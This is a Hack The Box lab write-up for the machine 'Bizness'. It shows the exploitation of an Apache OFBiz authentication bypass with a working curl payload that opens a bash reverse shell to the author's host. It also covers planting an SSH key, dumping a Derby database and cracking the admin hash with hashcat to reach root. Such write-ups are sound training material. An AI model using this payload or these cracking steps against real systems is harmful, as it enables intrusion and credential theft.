---
layout: post
title: Hack The Box Walkthrough - Bizness
date: 2024-05-25
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Easy
- Machine
permalink: /2024/05/HTB/Bizness
img: 2024/05/Bizness/Bizness.png
---

In this box, I exploited a known vulnerability in Apache OFBiz to get a shell. Then I extracted a password from a database and cracked it to become root.

* Room: Bizness
* Difficulty: {{ page.tags[3] }}
* URL: [https://app.hackthebox.com/machines/Bizness](https://app.hackthebox.com/machines/Bizness)
* Author: [C4rm3l0](https://app.hackthebox.com/users/458049)

## Enumeration

I began the box by scanning for open ports.

```bash
$ rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.129.28.106:22
Open 10.129.28.106:80
Open 10.129.28.106:443
Open 10.129.28.106:44863
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 19:41 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
...
Scanned at 2024-02-14 19:41:56 EST for 19s

PORT      STATE SERVICE    REASON  VERSION
22/tcp    open  ssh        syn-ack OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0B2izYdzgANpvBJW4Ym5zGRggYqa8smNlnRrVK6IuBtHzdlKgcFf+Gw0kSgJEouRe8eyVV9iAyD9HXM2L0N/17+rIZkSmdZPQi8chG/PyZ+H1FqcFB2LyxrynHCBLPTWyuN/tXkaVoDH/aZd1gn9QrbUjSVo9mfEEnUduO5Abf1mnBnkt3gLfBWKq1P1uBRZoAR3EYDiYCHbuYz30rhWR8SgE7CaNlwwZxDxYzJGFsKpKbR+t7ScsviVnbfEwPDWZVEmVEd0XYp1wb5usqWz2k7AMuzDpCyI8klc84aWVqllmLml443PDMIh1Ud2vUnze3FfYcBOo7DiJg7JkEWpcLa6iTModTaeA1tLSUJi3OYJoglW0xbx71di3141pDyROjnIpk/K45zR6CbdRSSqImPPXyo3UrkwFTPrSQbSZfeKzAKVDZxrVKq+rYtd+DWESp4nUdat0TXCgefpSkGfdGLxPZzFg0cQ/IF1cIyfzo1gicwVcLm4iRD9umBFaM2E=
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFMB/Pupk38CIbFpK4/RYPqDnnx8F2SGfhzlD32riRsRQwdf19KpqW9Cfpp2xDYZDhA3OeLV36bV5cdnl07bSsw=
|   256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOjcxHOO/Vs6yPUw6ibE6gvOuakAnmR7gTk/yE2yJA/3
80/tcp    open  http       syn-ack nginx 1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp   open  ssl/http   syn-ack nginx 1.18.0
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Issuer: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-12-14T20:03:40
| Not valid after:  2328-11-10T20:03:40
| MD5:   b182:2fdb:92b0:2036:6b98:8850:b66e:da27
| SHA-1: 8138:8595:4343:f40f:937b:cc82:23af:9052:3f5d:eb50
| -----BEGIN CERTIFICATE-----
| MIIDbTCCAlWgAwIBAgIUcNuUwJFmLYEqrKfOdzHtcHum2IwwDQYJKoZIhvcNAQEL
| BQAwRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
| GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yMzEyMTQyMDAzNDBaGA8yMzI4
| MTExMDIwMDM0MFowRTELMAkGA1UEBhMCVUsxEzARBgNVBAgMClNvbWUtU3RhdGUx
| ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAK4O2guKkSjwv8sruMD3DiDi1FoappVwDJ86afPZ
| XUCwlhtZD/9gPeXuRIy66QKNSzv8H7cGfzEL8peDF9YhmwvYc+IESuemPscZSlbr
| tSdWXVjn4kMRlah/2PnnWZ/Rc7I237V36lbsavjkY6SgBK8EPU3mAdHNdIBqB+XH
| ME/G3uP/Ut0tuhU1AAd7jiDktv8+c82EQx21/RPhuuZv7HA3pYdtkUja64bSu/kG
| 7FOWPxKTvYxxcWdO02GRXs+VLce+q8tQ7hRqAQI5vwWU6Ht3K82oftVPMZfT4BAp
| 4P4vhXvvcyhrjgjzGPH4QdDmyFkL3B4ljJfZrbXo4jXqp4kCAwEAAaNTMFEwHQYD
| VR0OBBYEFKXr9HwWqLMEFnr6keuCa8Fm7JOpMB8GA1UdIwQYMBaAFKXr9HwWqLME
| Fnr6keuCa8Fm7JOpMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AFruPmKZwggy7XRwDF6EJTnNe9wAC7SZrTPC1gAaNZ+3BI5RzUaOkElU0f+YBIci
| lSvcZde+dw+5aidyo5L9j3d8HAFqa/DP+xAF8Jya0LB2rIg/dSoFt0szla1jQ+Ff
| 6zMNMNseYhCFjHdxfroGhUwYWXEpc7kT7hL9zYy5Gbmd37oLYZAFQv+HNfjHnE+2
| /gTR+RwkAf81U3b7Czl39VJhMu3eRkI3Kq8LiZYoFXr99A4oefKg1xiN3vKEtou/
| c1zAVUdnau5FQSAbwjDg0XqRrs1otS0YQhyMw/3D8X+f/vPDN9rFG8l9Q5wZLmCa
| zj1Tly1wsPCYAq9u570e22U=
|_-----END CERTIFICATE-----
|_http-title: Did not follow redirect to https://bizness.htb/
| tls-alpn:
|_  http/1.1
|_http-server-header: nginx/1.18.0
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| tls-nextprotoneg:
|_  http/1.1
44863/tcp open  tcpwrapped syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:42
Completed NSE at 19:42, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:42
Completed NSE at 19:42, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:42
Completed NSE at 19:42, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.75 seconds
```

There were four open ports.

* 22 - SSH
* 80 - HTTP
* 443 - HTTPS
* 44863 - Unknown

Port 44863 looked interesting. I had no idea what could be on that port. And if I restarted the box, it was on a different port. I tried to connect to it with netcat, I just got disconnected. I will not need to use what runs on this port (Gradle) to root the box.

```bash
$ nc target 44863
➜  Bizness
$ nc target -vv 44863
target [10.129.233.72] 44863 (?) open
 sent 0, rcvd 0
```

Ports 80 and 443 were redirecting to 'https://bizness.htb/'. I added the domain to hosts file. I scanned for subdomains and UDP ports, but did not find anything of interest.

## Website

I launched a browser and looked at the website.

![Website](/assets/images/2024/05/Bizness/Website.png "Website")

The site was simple. There was a contact form that didn't do anything. And a newsletter form that posted the email to the main page.

The bottom of the page said that the site was built with [Apache OFBiz](https://ofbiz.apache.org/).

![Powered By](/assets/images/2024/05/Bizness/PoweredBy.png "Powered By")

So did the error pages.

![Error](/assets/images/2024/05/Bizness/OFBizError.png "Error")
![Error](/assets/images/2024/05/Bizness/OFBizError2.png "Error")

A quick search found an [Unauthenticated Remote Code execution](https://vulncheck.com/blog/ofbiz-cve-2023-51467) vulnerability. The application has a sandbox that allows executing Groovy code.

I found a [POC](https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT) that showed how to confirm if it was vulnerable. I needed to send a simple `curl` request and checked if it replied with 'PONG'.

```bash
$ curl -k "https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y"

PONG
```

It did. Next I used the example from the blog post to get a reverse shell.

```bash
$ curl -kv -H "Host: bizness.htb:443" \
-d "groovyProgram=x=new String[3];x[0]='bash';x[1]='-c';x[2]='bash -i >%26 /dev/tcp/10.10.14.64/4444 0>%261;';x.execute();" \
"https://bizness.htb:443/webtools/control/ProgramExport/?requirePasswordChange=Y&PASSWORD=lobster&USERNAME=albino"

* Host bizness.htb:443 was resolved.
* IPv6: (none)
* IPv4: 10.129.23.201
*   Trying 10.129.23.201:443...
* Connected to bizness.htb (10.129.23.201) port 443
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
* TLSv1.3 (IN), TLS handshake, Certificate (11):
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
* TLSv1.3 (IN), TLS handshake, Finished (20):
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.3 (OUT), TLS handshake, Finished (20):
* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384 / X25519 / RSASSA-PSS
* ALPN: server accepted http/1.1
* Server certificate:
*  subject: C=UK; ST=Some-State; O=Internet Widgits Pty Ltd
*  start date: Dec 14 20:03:40 2023 GMT
*  expire date: Nov 10 20:03:40 2328 GMT
*  issuer: C=UK; ST=Some-State; O=Internet Widgits Pty Ltd
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* using HTTP/1.x
> POST /webtools/control/ProgramExport/?requirePasswordChange=Y&PASSWORD=lobster&USERNAME=albino HTTP/1.1
> Host: bizness.htb:443
> User-Agent: curl/8.5.0
> Accept: */*
> Content-Length: 118
> Content-Type: application/x-www-form-urlencoded
>
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* old SSL session ID is stale, removing
< HTTP/1.1 200
< Server: nginx/1.18.0
< Date: Sat, 17 Feb 2024 15:04:20 GMT
< Content-Type: text/html;charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: JSESSIONID=32660C7551954BEF0283BC9959BB27DC.jvm1; Path=/webtools; Secure; HttpOnly; SameSite=strict
< Cache-Control: Set-Cookie
< x-frame-options: sameorigin
< strict-transport-security: max-age=31536000; includeSubDomains
< x-content-type-options: nosniff
< X-XSS-Protection: 1; mode=block
< Referrer-Policy: no-referrer-when-downgrade
< Content-Security-Policy-Report-Only: default-src 'self'
< Set-Cookie: OFBiz.Visitor=10611; Max-Age=31536000; Expires=Sun, 16 Feb 2025 15:04:20 GMT; Path=/; Secure; HttpOnly; SameSite=strict
< vary: accept-encoding
<
<!DOCTYPE html>
<!-- Begin Screen component://webtools/widget/EntityScreens.xml#ProgramExport -->
<!-- Begin Screen component://webtools/widget/CommonScreens.xml#CommonImportExportDecorator -->
<!-- Begin Screen component://webtools/widget/CommonScreens.xml#main-decorator -->
<!-- Begin Screen component://common/widget/CommonScreens.xml#GlobalDecorator -->

...
* Connection #0 to host bizness.htb left intact
```

I got a hit on my netcat listener and I could read the user flag.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.64] from (UNKNOWN) [10.129.23.201] 53342
bash: cannot set terminal process group (795): Inappropriate ioctl for device
bash: no job control in this shell
ofbiz@bizness:/opt/ofbiz$ whoami
whoami
ofbiz

ofbiz@bizness:/opt/ofbiz$ ls /home
ls /home
ofbiz

ofbiz@bizness:/opt/ofbiz$ ls ~/
ls ~/
user.txt

ofbiz@bizness:/opt/ofbiz$ cat ~/user.txt
cat ~/user.txt
REDACTED
```

## Getting root

Once on the server, I copied my public key to the user's home folder and reconnected with SSH.

```bash
ofbiz@bizness:/opt/ofbiz$ cd
cd

ofbiz@bizness:~$ mkdir .ssh
mkdir .ssh

ofbiz@bizness:~$ echo ssh-rsa AAAAB3Nz...= > .ssh/authorized_keys
...= > .ssh/authorized_keys

ofbiz@bizness:~$ chmod 700 .ssh
chmod 700 .ssh

ofbiz@bizness:~$ chmod 600 .ssh/authorized_keys
chmod 600 .ssh/authorized_keys
```

Then, I started looking at ways to escalate my privileges.

```bash
ofbiz@bizness:~$ crontab -l
no crontab for ofbiz

ofbiz@bizness:~$ sudo -l
[sudo] password for ofbiz:
sudo: a password is required

ofbiz@bizness:~$ find / -perm /u=s 2>/dev/null
/usr/bin/mount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

There were no cronjobs, no suspicious suid binaries, and I could not run `sudo` without the user's password.

I looked at the OFBiz application and found a `data` directory.

```bash
ofbiz@bizness:~$ ls -la /opt/ofbiz/runtime/data/
total 20
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Mar 10 12:41 .
drwxr-xr-x 9 ofbiz ofbiz-operator 4096 Dec 21 09:15 ..
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Mar 10 12:40 derby
-rw-r--r-- 1 ofbiz ofbiz-operator 1231 Oct 13 12:04 derby.properties
-rw-r--r-- 1 ofbiz ofbiz-operator   88 Oct 13 12:04 README
```

[Derby](https://db.apache.org/derby/) is a relational database from Apache. I downloaded the files to my machine and installed the Derby tools so I could access it. Then I connected to it and started exploring.

```sql
$ ij
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ij version 10.14
ij> connect 'jdbc:derby:/home/ehogue/Kali/OnlineCTFs/HackTheBox/Bizness/db/derby/ofbiz/';

ij> Show tables;
TABLE_SCHEM         |TABLE_NAME                    |REMARKS
------------------------------------------------------------------------
SYS                 |SYSALIASES                    |
SYS                 |SYSCHECKS                     |
SYS                 |SYSCOLPERMS                   |
SYS                 |SYSCOLUMNS                    |
...

OFBIZ               |USER_AGENT                    |
OFBIZ               |USER_AGENT_METHOD_TYPE        |
OFBIZ               |USER_AGENT_TYPE               |
OFBIZ               |USER_LOGIN                    |
OFBIZ               |USER_LOGIN_HISTORY            |
OFBIZ               |USER_LOGIN_PASSWORD_HISTORY   |
OFBIZ               |USER_LOGIN_SECURITY_GROUP     |
OFBIZ               |USER_LOGIN_SECURITY_QUESTION  |
OFBIZ               |USER_LOGIN_SESSION            |
OFBIZ               |USER_PREFERENCE               |
OFBIZ               |USER_PREF_GROUP_TYPE          |
OFBIZ               |VALID_CONTACT_MECH_ROLE       |
...

877 rows selected

ij> Select USER_LOGIN_ID, CURRENT_PASSWORD From OFBIZ.USER_LOGIN;
USER_LOGIN_ID                                      | CURRENT_PASSWORD                                                           
-----------------------------------------------------------------------
system                                             | NULL                                                                                                                            
anonymous                                          | NULL                                                                                                                            
admin                                              | $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I                                                                                              

3 rows selected
```

There were a lot of tables, but I immediately looked at `USER_LOGIN` as it looked like it might contain credentials. I found a password hash, but the format was not something `hashcat` seems to handle. Luckily, I quickly found a [script to convert it](https://gist.github.com/Yeeb1/c9ee1fb65c874423100573d6bdf1dbfd) to SHA1.

I ran the script, saved the result to a file, and launched `hashcat` to crack it.

```bash
$ python ofbiz2hashcat.py '$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
Converted Hash (suitable for Hashcat -m 120): b8fd3f41a541a435857a8f3e751cc3a91c174362:d

$ vim hash.txt

$ hashcat -a0 -m120 hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 6849/13763 MB (2048 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip

...

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

b8fd3f41a541a435857a8f3e751cc3a91c174362:d:REDACTED

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 120 (sha1($salt.$pass))
Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d
Time.Started.....: Sat Feb 17 12:29:09 2024 (0 secs)
Time.Estimated...: Sat Feb 17 12:29:09 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7358.8 kH/s (0.32ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1480704/14344384 (10.32%)
Rejected.........: 0/1480704 (0.00%)
Restore.Point....: 1474560/14344384 (10.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: mosmosmos -> mommy1202
Hardware.Mon.#1..: Util: 14%

Started: Sat Feb 17 12:28:55 2024
Stopped: Sat Feb 17 12:29:10 2024
```

It took 15 seconds for `hashcat` to crack it. I tried using the password with `sudo`, that failed. I tried it as root with `su` and that worked.

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data$ sudo -l
[sudo] password for ofbiz:
Sorry, try again.
[sudo] password for ofbiz:
Sorry, try again.
[sudo] password for ofbiz:
sudo: 2 incorrect password attempts

ofbiz@bizness:/opt/ofbiz/runtime/data$ su
Password:

root@bizness:/opt/ofbiz/runtime/data# cat /root/root.txt
REDACTED
```

